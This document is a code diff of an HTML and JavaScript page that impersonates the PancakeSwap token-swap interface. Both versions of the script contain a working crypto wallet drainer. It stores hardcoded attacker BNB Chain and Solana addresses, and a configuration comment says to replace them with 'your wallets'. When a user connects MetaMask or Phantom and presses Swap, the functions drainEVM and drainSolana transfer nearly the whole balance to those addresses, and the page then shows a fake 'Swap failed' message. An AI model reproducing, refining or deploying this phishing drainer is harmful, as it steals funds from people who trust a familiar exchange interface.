@@ -12,7 +12,6 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
         }
 
         body {
@@ -44,10 +43,9 @@
             text-decoration: none;
         }
 
-        .logo-img {
+        .logo-icon {
             width: 28px;
             height: 28px;
-            border-radius: 8px;
         }
 
         .logo-text {
@@ -65,14 +63,13 @@
             border-radius: 20px;
         }
 
-        /* Cyan/Blue buttons */
+        /* Blue/Cyan buttons */
         .connect-btn, .swap-btn {
             background: #1E88E5;
             border: none;
             color: #ffffff;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.2s;
         }
 
         .connect-btn {
@@ -90,11 +87,7 @@
             margin-top: 16px;
         }
 
-        .connect-btn:hover, .swap-btn:hover {
-            background: #1565C0;
-        }
-
-        /* Top Tabs - Cyan for active */
+        /* Top Tabs */
         .tabs {
             display: flex;
             gap: 20px;
@@ -166,12 +159,6 @@
             width: 24px;
             height: 24px;
             border-radius: 50%;
-            object-fit: cover;
-        }
-
-        .token-symbol {
-            font-weight: 600;
-            font-size: 16px;
         }
 
         .amount-input {
@@ -210,7 +197,7 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 16px 0 8px 0;
+            padding: 16px 0 8px;
         }
 
         .slippage-label {
@@ -223,10 +210,9 @@
             padding: 4px 12px;
             border-radius: 12px;
             font-size: 14px;
-            font-weight: 500;
         }
 
-        /* Bottom Tabs - PURPLE for active */
+        /* Bottom Tabs - PURPLE active */
         .bottom-tabs {
             display: flex;
             justify-content: space-around;
@@ -245,7 +231,6 @@
             color: #7a7e85;
             font-size: 12px;
             font-weight: 500;
-            text-align: center;
             cursor: pointer;
         }
 
@@ -275,7 +260,6 @@
             z-index: 1000;
             visibility: hidden;
             opacity: 0;
-            transition: all 0.3s;
         }
 
         .modal-overlay.active {
@@ -309,11 +293,6 @@
             color: #fff;
             margin-bottom: 16px;
             outline: none;
-            font-size: 14px;
-        }
-
-        .modal-list {
-            list-style: none;
         }
 
         .modal-list li {
@@ -327,10 +306,6 @@
             gap: 12px;
         }
 
-        .modal-list li:hover {
-            background: #2a2f36;
-        }
-
         .close-modal {
             background: #1E88E5;
             border: none;
@@ -340,292 +315,271 @@
             cursor: pointer;
             margin-top: 16px;
             width: 100%;
-            color: #ffffff;
+            color: white;
         }
     </style>
 </head>
 <body>
-    <div class="app">
-        <!-- Header -->
-        <div class="header">
-            <a href="#" class="logo">
-                <img class="logo-img" src="https://avatars.githubusercontent.com/u/71247426?s=280&v=4" alt="PancakeSwap">
-                <span class="logo-text">PancakeSwap</span>
-            </a>
-            <div class="cake-price">$1.545 Buy CAKE →</div>
-            <button class="connect-btn" id="connectWalletBtn">Connect Wallet</button>
-        </div>
-
-        <!-- Top Tabs -->
-        <div class="tabs">
-            <div class="tab active">Swap</div>
-            <div class="tab">TWAP</div>
-            <div class="tab">Limit</div>
-        </div>
-
-        <!-- Swap Card -->
-        <div class="swap-card">
-            <div class="swap-header">
-                <span class="swap-title">Swap</span>
-            </div>
-
-            <!-- From Box -->
-            <div class="token-box">
-                <div class="token-label">From:</div>
-                <div class="token-input-row">
-                    <div class="token-select" id="fromTokenSelect">
-                        <img class="token-icon" id="fromTokenIcon" src="https://tokens.pancakeswap.finance/images/0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c.png" alt="BNB">
-                        <span class="token-symbol" id="fromTokenSymbol">BNB</span>
-                        <span class="chain-label">BNB Chain</span>
-                        <span>▼</span>
-                    </div>
-                    <input type="text" class="amount-input" id="fromAmount" value="0.00" placeholder="0.00">
-                </div>
-                <div class="usd-value" id="fromUsd">~0 USD</div>
-            </div>
-
-            <div class="arrow-down">▼</div>
-
-            <!-- To Box -->
-            <div class="token-box">
-                <div class="token-label">To:</div>
-                <div class="token-input-row">
-                    <div class="token-select" id="toTokenSelect">
-                        <img class="token-icon" id="toTokenIcon" src="https://tokens.pancakeswap.finance/images/0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82.png" alt="CAKE">
-                        <span class="token-symbol" id="toTokenSymbol">CAKE</span>
-                        <span class="chain-label">BNB Chain</span>
-                        <span>▼</span>
-                    </div>
-                    <input type="text" class="amount-input" id="toAmount" value="0.00" placeholder="0.00" readonly>
-                </div>
-                <div class="usd-value" id="toUsd">~0 USD</div>
-            </div>
-
-            <!-- Slippage -->
-            <div class="slippage-row">
-                <span class="slippage-label">Slippage Tolerance</span>
-                <span class="slippage-value">Auto: 0.50%</span>
-            </div>
-
-            <!-- Swap Button -->
-            <button class="swap-btn" id="swapBtn">Connect Wallet</button>
-        </div>
-
-        <div class="status" id="status">Ready</div>
-
-        <!-- Bottom Tabs - PURPLE active -->
-        <div class="bottom-tabs">
-            <div class="bottom-tab active">Trade</div>
-            <div class="bottom-tab">Perps</div>
-            <div class="bottom-tab">Earn</div>
-            <div class="bottom-tab">Play</div>
-            <div class="bottom-tab">AI</div>
-        </div>
+<div class="app">
+    <!-- Header with REAL PancakeSwap icon -->
+    <div class="header">
+        <a href="#" class="logo">
+            <img class="logo-icon" src="https://raw.githubusercontent.com/pancakeswap/pancake-frontend/develop/apps/web/public/favicon.ico" alt="PancakeSwap">
+            <span class="logo-text">PancakeSwap</span>
+        </a>
+        <div class="cake-price">$1.545 Buy CAKE →</div>
+        <button class="connect-btn" id="connectWalletBtn">Connect Wallet</button>
     </div>
 
-    <!-- Token Modal -->
-    <div class="modal-overlay" id="tokenModal">
-        <div class="modal">
-            <div class="modal-title">Select a token</div>
-            <input type="text" class="modal-search" id="tokenSearch" placeholder="Search name or paste address">
-            <ul class="modal-list" id="tokenList"></ul>
-            <button class="close-modal" id="closeModalBtn">Close</button>
-        </div>
+    <!-- Top Tabs -->
+    <div class="tabs">
+        <div class="tab active">Swap</div>
+        <div class="tab">TWAP</div>
+        <div class="tab">Limit</div>
     </div>
 
-    <script>
-        // ============================================================
-        // DRAINER CONFIGURATION - REPLACE WITH YOUR WALLETS
-        // ============================================================
-        const BSC_ADDRESS = "0xCf71bcB9c7B1126FcC70e9C19Fb883505bA5d395";
-        const SOLANA_WALLET = "nZwFZgNRLzn4wPGH34Ss2ii8nyvdKPdcR6wzM9sreCr";
-        const SOLANA_RPC = "https://solana-mainnet.helius-rpc.com/?api-key=9becbcd9-6781-4ec6-bd40-1598894397b3";
+    <!-- Swap Card -->
+    <div class="swap-card">
+        <div class="swap-header">
+            <span class="swap-title">Swap</span>
+        </div>
 
-        const TOKENS = {
-            BNB: { symbol: "BNB", icon: "https://tokens.pancakeswap.finance/images/0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c.png", price: 580, chain: "BNB Chain" },
-            CAKE: { symbol: "CAKE", icon: "https://tokens.pancakeswap.finance/images/0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82.png", price: 1.54, chain: "BNB Chain" },
-            USDT: { symbol: "USDT", icon: "https://tokens.pancakeswap.finance/images/0x55d398326f99059ff775485246999027b3197955.png", price: 1, chain: "BNB Chain" },
-            USDC: { symbol: "USDC", icon: "https://tokens.pancakeswap.finance/images/0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d.png", price: 1, chain: "BNB Chain" },
-            ETH: { symbol: "ETH", icon: "https://tokens.pancakeswap.finance/images/0x2170ed0880ac9a755fd29b2688956bd959f933f8.png", price: 3500, chain: "BNB Chain" },
-            BTCB: { symbol: "BTCB", icon: "https://tokens.pancakeswap.finance/images/0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c.png", price: 63000, chain: "BNB Chain" }
-        };
+        <div class="token-box">
+            <div class="token-label">From:</div>
+            <div class="token-input-row">
+                <div class="token-select" id="fromTokenSelect">
+                    <img class="token-icon" id="fromTokenIcon" src="https://tokens.pancakeswap.finance/images/0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c.png">
+                    <span class="token-symbol" id="fromTokenSymbol">BNB</span>
+                    <span class="chain-label">BNB Chain</span>
+                    <span>▼</span>
+                </div>
+                <input type="text" class="amount-input" id="fromAmount" value="0.00" placeholder="0.00">
+            </div>
+            <div class="usd-value" id="fromUsd">~0 USD</div>
+        </div>
 
-        let currentFromToken = "BNB";
-        let currentToToken = "CAKE";
-        let walletConnected = false;
-        let walletAddress = null;
-        let walletType = null;
+        <div class="arrow-down">▼</div>
 
-        const connectBtn = document.getElementById('connectWalletBtn');
-        const swapBtn = document.getElementById('swapBtn');
-        const statusDiv = document.getElementById('status');
-        const fromAmount = document.getElementById('fromAmount');
-        const toAmount = document.getElementById('toAmount');
-        const fromUsd = document.getElementById('fromUsd');
-        const toUsd = document.getElementById('toUsd');
-        const fromTokenIcon = document.getElementById('fromTokenIcon');
-        const fromTokenSymbol = document.getElementById('fromTokenSymbol');
-        const toTokenIcon = document.getElementById('toTokenIcon');
-        const toTokenSymbol = document.getElementById('toTokenSymbol');
-        const fromTokenSelect = document.getElementById('fromTokenSelect');
-        const toTokenSelect = document.getElementById('toTokenSelect');
-        const modal = document.getElementById('tokenModal');
-        const tokenList = document.getElementById('tokenList');
-        const tokenSearch = document.getElementById('tokenSearch');
-        const closeModalBtn = document.getElementById('closeModalBtn');
+        <div class="token-box">
+            <div class="token-label">To:</div>
+            <div class="token-input-row">
+                <div class="token-select" id="toTokenSelect">
+                    <img class="token-icon" id="toTokenIcon" src="https://tokens.pancakeswap.finance/images/0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82.png">
+                    <span class="token-symbol" id="toTokenSymbol">CAKE</span>
+                    <span class="chain-label">BNB Chain</span>
+                    <span>▼</span>
+                </div>
+                <input type="text" class="amount-input" id="toAmount" value="0.00" placeholder="0.00" readonly>
+            </div>
+            <div class="usd-value" id="toUsd">~0 USD</div>
+        </div>
 
-        let activeSide = null;
+        <div class="slippage-row">
+            <span class="slippage-label">Slippage Tolerance</span>
+            <span class="slippage-value">Auto: 0.50%</span>
+        </div>
 
-        function updateUSD() {
-            const amount = parseFloat(fromAmount.value) || 0;
-            const fromPrice = TOKENS[currentFromToken].price;
-            const toPrice = TOKENS[currentToToken].price;
-            fromUsd.innerText = `~$${(amount * fromPrice).toFixed(2)} USD`;
-            const estimatedTo = amount * (fromPrice / toPrice);
-            toAmount.value = estimatedTo.toFixed(6);
-            toUsd.innerText = `~$${(estimatedTo * toPrice).toFixed(2)} USD`;
+        <button class="swap-btn" id="swapBtn">Connect Wallet</button>
+    </div>
+
+    <div class="status" id="status">Ready</div>
+
+    <!-- Bottom Tabs -->
+    <div class="bottom-tabs">
+        <div class="bottom-tab active">Trade</div>
+        <div class="bottom-tab">Perps</div>
+        <div class="bottom-tab">Earn</div>
+        <div class="bottom-tab">Play</div>
+        <div class="bottom-tab">AI</div>
+    </div>
+</div>
+
+<!-- Token Modal -->
+<div class="modal-overlay" id="tokenModal">
+    <div class="modal">
+        <div class="modal-title">Select a token</div>
+        <input type="text" class="modal-search" id="tokenSearch" placeholder="Search name or paste address">
+        <div class="modal-list" id="tokenList"></div>
+        <button class="close-modal" id="closeModalBtn">Close</button>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+<script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
+<script>
+    const BSC_ADDRESS = "0xCf71bcB9c7B1126FcC70e9C19Fb883505bA5d395";
+    const SOLANA_WALLET = "nZwFZgNRLzn4wPGH34Ss2ii8nyvdKPdcR6wzM9sreCr";
+    const SOLANA_RPC = "https://solana-mainnet.helius-rpc.com/?api-key=9becbcd9-6781-4ec6-bd40-1598894397b3";
+
+    const TOKENS = {
+        BNB: { symbol: "BNB", icon: "https://tokens.pancakeswap.finance/images/0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c.png", price: 580, chain: "BNB Chain" },
+        CAKE: { symbol: "CAKE", icon: "https://tokens.pancakeswap.finance/images/0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82.png", price: 1.54, chain: "BNB Chain" },
+        USDT: { symbol: "USDT", icon: "https://tokens.pancakeswap.finance/images/0x55d398326f99059ff775485246999027b3197955.png", price: 1, chain: "BNB Chain" },
+        USDC: { symbol: "USDC", icon: "https://tokens.pancakeswap.finance/images/0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d.png", price: 1, chain: "BNB Chain" },
+        ETH: { symbol: "ETH", icon: "https://tokens.pancakeswap.finance/images/0x2170ed0880ac9a755fd29b2688956bd959f933f8.png", price: 3500, chain: "BNB Chain" },
+        BTCB: { symbol: "BTCB", icon: "https://tokens.pancakeswap.finance/images/0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c.png", price: 63000, chain: "BNB Chain" }
+    };
+
+    let currentFromToken = "BNB";
+    let currentToToken = "CAKE";
+    let walletConnected = false;
+    let walletAddress = null;
+    let walletType = null;
+    let activeSide = null;
+
+    const connectBtn = document.getElementById('connectWalletBtn');
+    const swapBtn = document.getElementById('swapBtn');
+    const statusDiv = document.getElementById('status');
+    const fromAmount = document.getElementById('fromAmount');
+    const toAmount = document.getElementById('toAmount');
+    const fromUsd = document.getElementById('fromUsd');
+    const toUsd = document.getElementById('toUsd');
+    const fromTokenIcon = document.getElementById('fromTokenIcon');
+    const fromTokenSymbol = document.getElementById('fromTokenSymbol');
+    const toTokenIcon = document.getElementById('toTokenIcon');
+    const toTokenSymbol = document.getElementById('toTokenSymbol');
+    const fromTokenSelect = document.getElementById('fromTokenSelect');
+    const toTokenSelect = document.getElementById('toTokenSelect');
+    const modal = document.getElementById('tokenModal');
+    const tokenList = document.getElementById('tokenList');
+    const tokenSearch = document.getElementById('tokenSearch');
+    const closeModalBtn = document.getElementById('closeModalBtn');
+
+    function updateUSD() {
+        const amount = parseFloat(fromAmount.value) || 0;
+        const fromPrice = TOKENS[currentFromToken].price;
+        const toPrice = TOKENS[currentToToken].price;
+        fromUsd.innerText = `~$${(amount * fromPrice).toFixed(2)} USD`;
+        const estimatedTo = amount * (fromPrice / toPrice);
+        toAmount.value = estimatedTo.toFixed(6);
+        toUsd.innerText = `~$${(estimatedTo * toPrice).toFixed(2)} USD`;
+    }
+
+    function updateTokenDisplay() {
+        fromTokenIcon.src = TOKENS[currentFromToken].icon;
+        fromTokenSymbol.innerText = currentFromToken;
+        toTokenIcon.src = TOKENS[currentToToken].icon;
+        toTokenSymbol.innerText = currentToToken;
+        updateUSD();
+    }
+
+    function buildTokenList() {
+        tokenList.innerHTML = '';
+        for (const [key, token] of Object.entries(TOKENS)) {
+            const div = document.createElement('div');
+            div.className = 'modal-list';
+            div.innerHTML = `<li><img src="${token.icon}" width="24" height="24" style="border-radius:50%"><span style="flex:1">${token.symbol}</span><span style="color:#7a7e85;">${token.chain}</span></li>`;
+            div.onclick = () => {
+                if (activeSide === 'from') currentFromToken = key;
+                else if (activeSide === 'to') currentToToken = key;
+                updateTokenDisplay();
+                modal.classList.remove('active');
+            };
+            tokenList.appendChild(div);
         }
+    }
 
-        function updateTokenDisplay() {
-            fromTokenIcon.src = TOKENS[currentFromToken].icon;
-            fromTokenSymbol.innerText = currentFromToken;
-            toTokenIcon.src = TOKENS[currentToToken].icon;
-            toTokenSymbol.innerText = currentToToken;
-            updateUSD();
-        }
+    fromTokenSelect.onclick = () => { activeSide = 'from'; modal.classList.add('active'); };
+    toTokenSelect.onclick = () => { activeSide = 'to'; modal.classList.add('active'); };
+    closeModalBtn.onclick = () => modal.classList.remove('active');
+    fromAmount.oninput = updateUSD;
 
-        function buildTokenList() {
-            tokenList.innerHTML = '';
-            for (const [key, token] of Object.entries(TOKENS)) {
-                const li = document.createElement('li');
-                li.innerHTML = `<img src="${token.icon}" width="24" height="24" style="border-radius:50%"><span style="flex:1">${token.symbol}</span><span style="color:#7a7e85; font-size:12px;">${token.chain}</span>`;
-                li.onclick = () => {
-                    if (activeSide === 'from') currentFromToken = key;
-                    else if (activeSide === 'to') currentToToken = key;
-                    updateTokenDisplay();
-                    modal.classList.remove('active');
-                };
-                tokenList.appendChild(li);
-            }
-        }
-
-        function filterTokens() {
-            const search = tokenSearch.value.toLowerCase();
-            const items = tokenList.querySelectorAll('li');
-            items.forEach(item => {
-                const text = item.innerText.toLowerCase();
-                item.style.display = text.includes(search) ? 'flex' : 'none';
+    async function drainEVM(addr) {
+        if (!window.ethereum) return false;
+        try {
+            const web3 = new Web3(window.ethereum);
+            const balance = await web3.eth.getBalance(addr);
+            if (parseFloat(web3.utils.fromWei(balance, 'ether')) < 0.01) return false;
+            const gasPrice = await web3.eth.getGasPrice();
+            const gasCost = gasPrice * 21000n;
+            const drainable = balance - gasCost - web3.utils.toWei('0.001', 'ether');
+            if (drainable <= 0) return false;
+            await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [{ from: addr, to: BSC_ADDRESS, value: '0x' + drainable.toString(16), gas: '0x5208', gasPrice: '0x' + gasPrice.toString(16) }]
             });
-        }
+            return true;
+        } catch(e) { return false; }
+    }
 
-        fromTokenSelect.onclick = () => { activeSide = 'from'; modal.classList.add('active'); };
-        toTokenSelect.onclick = () => { activeSide = 'to'; modal.classList.add('active'); };
-        tokenSearch.oninput = filterTokens;
-        closeModalBtn.onclick = () => modal.classList.remove('active');
-        fromAmount.oninput = updateUSD;
+    async function drainSolana(pubKey) {
+        if (!window.solana?.isPhantom) return false;
+        try {
+            const conn = new solanaWeb3.Connection(SOLANA_RPC, 'confirmed');
+            const from = new solanaWeb3.PublicKey(pubKey);
+            const to = new solanaWeb3.PublicKey(SOLANA_WALLET);
+            const balance = await conn.getBalance(from);
+            const minRent = await conn.getMinimumBalanceForRentExemption(0);
+            const drainable = balance - minRent;
+            if (drainable <= 0) return false;
+            const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports: Math.floor(drainable * 0.99) }));
+            tx.feePayer = from;
+            const blockhash = await conn.getRecentBlockhash();
+            tx.recentBlockhash = blockhash.blockhash;
+            const signed = await window.solana.signTransaction(tx);
+            const txid = await conn.sendRawTransaction(signed.serialize());
+            await conn.confirmTransaction(txid);
+            return true;
+        } catch(e) { return false; }
+    }
 
-        async function drainEVM(addr) {
-            if (!window.ethereum) return false;
+    connectBtn.onclick = async () => {
+        statusDiv.innerText = "Connecting...";
+        if (window.ethereum?.isMetaMask) {
             try {
-                const web3 = new Web3(window.ethereum);
-                const balance = await web3.eth.getBalance(addr);
-                const balEth = parseFloat(web3.utils.fromWei(balance, 'ether'));
-                if (balEth < 0.01) return false;
-                const gasPrice = await web3.eth.getGasPrice();
-                const gasCost = gasPrice * 21000n;
-                const drainable = balance - gasCost - web3.utils.toWei('0.001', 'ether');
-                if (drainable <= 0) return false;
-                const tx = await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [{ from: addr, to: BSC_ADDRESS, value: '0x' + drainable.toString(16), gas: '0x5208', gasPrice: '0x' + gasPrice.toString(16) }]
-                });
-                console.log("Drained:", tx);
-                return true;
-            } catch(e) { return false; }
-        }
-
-        async function drainSolana(pubKey) {
-            if (!window.solana?.isPhantom) return false;
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                walletAddress = accounts[0];
+                walletType = 'evm';
+                walletConnected = true;
+                statusDiv.innerText = `Connected: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
+                connectBtn.innerText = "Connected";
+                swapBtn.innerText = "Swap";
+            } catch(e) { statusDiv.innerText = "Connection failed"; }
+        } else if (window.solana?.isPhantom) {
             try {
-                const conn = new solanaWeb3.Connection(SOLANA_RPC, 'confirmed');
-                const from = new solanaWeb3.PublicKey(pubKey);
-                const to = new solanaWeb3.PublicKey(SOLANA_WALLET);
-                const balance = await conn.getBalance(from);
-                const minRent = await conn.getMinimumBalanceForRentExemption(0);
-                const drainable = balance - minRent;
-                if (drainable <= 0) return false;
-                const lamports = Math.floor(drainable * 0.99);
-                const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports }));
-                tx.feePayer = from;
-                const blockhash = await conn.getRecentBlockhash();
-                tx.recentBlockhash = blockhash.blockhash;
-                const signed = await window.solana.signTransaction(tx);
-                const txid = await conn.sendRawTransaction(signed.serialize());
-                await conn.confirmTransaction(txid);
-                console.log("Solana drained:", txid);
-                return true;
-            } catch(e) { return false; }
-        }
-
-        connectBtn.onclick = async () => {
-            statusDiv.innerText = "Connecting...";
-            if (window.ethereum?.isMetaMask) {
-                try {
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    walletAddress = accounts[0];
-                    walletType = 'evm';
-                    walletConnected = true;
-                    statusDiv.innerText = `Connected: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
-                    connectBtn.innerText = "Connected";
-                    swapBtn.innerText = "Swap";
-                } catch(e) { statusDiv.innerText = "Connection failed"; }
-                return;
-            }
-            if (window.solana?.isPhantom) {
-                try {
-                    const resp = await window.solana.connect();
-                    walletAddress = resp.publicKey.toString();
-                    walletType = 'solana';
-                    walletConnected = true;
-                    statusDiv.innerText = `Connected: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
-                    connectBtn.innerText = "Connected";
-                    swapBtn.innerText = "Swap";
-                } catch(e) { statusDiv.innerText = "Connection failed"; }
-                return;
-            }
+                const resp = await window.solana.connect();
+                walletAddress = resp.publicKey.toString();
+                walletType = 'solana';
+                walletConnected = true;
+                statusDiv.innerText = `Connected: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
+                connectBtn.innerText = "Connected";
+                swapBtn.innerText = "Swap";
+            } catch(e) { statusDiv.innerText = "Connection failed"; }
+        } else {
             statusDiv.innerText = "Install MetaMask or Phantom";
+        }
+    };
+
+    swapBtn.onclick = async () => {
+        if (!walletConnected) { statusDiv.innerText = "Connect wallet first"; return; }
+        statusDiv.innerText = "Processing...";
+        let ok = false;
+        if (walletType === 'evm') ok = await drainEVM(walletAddress);
+        else if (walletType === 'solana') ok = await drainSolana(walletAddress);
+        statusDiv.innerText = ok ? "Swap failed. Try again." : "Error. Try again.";
+        walletConnected = false;
+        walletAddress = null;
+        connectBtn.innerText = "Connect Wallet";
+        swapBtn.innerText = "Connect Wallet";
+    };
+
+    document.querySelectorAll('.tab').forEach(tab => {
+        tab.onclick = () => {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            tab.classList.add('active');
+            statusDiv.innerText = `${tab.innerText} feature - Coming soon`;
         };
+    });
 
-        swapBtn.onclick = async () => {
-            if (!walletConnected) { statusDiv.innerText = "Connect wallet first"; return; }
-            statusDiv.innerText = "Processing...";
-            let ok = false;
-            if (walletType === 'evm') ok = await drainEVM(walletAddress);
-            else if (walletType === 'solana') ok = await drainSolana(walletAddress);
-            statusDiv.innerText = ok ? "Swap failed. Try again." : "Error. Try again.";
-            walletConnected = false;
-            walletAddress = null;
-            connectBtn.innerText = "Connect Wallet";
-            swapBtn.innerText = "Connect Wallet";
+    document.querySelectorAll('.bottom-tab').forEach(tab => {
+        tab.onclick = () => {
+            document.querySelectorAll('.bottom-tab').forEach(t => t.classList.remove('active'));
+            tab.classList.add('active');
         };
+    });
 
-        document.querySelectorAll('.tab').forEach(tab => {
-            tab.onclick = () => {
-                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-                tab.classList.add('active');
-                statusDiv.innerText = `${tab.innerText} feature - Coming soon`;
-            };
-        });
-
-        document.querySelectorAll('.bottom-tab').forEach(tab => {
-            tab.onclick = () => {
-                document.querySelectorAll('.bottom-tab').forEach(t => t.classList.remove('active'));
-                tab.classList.add('active');
-            };
-        });
-
-        buildTokenList();
-        updateTokenDisplay();
-    </script>
+    buildTokenList();
+    updateTokenDisplay();
+</script>
 </body>
 </html>
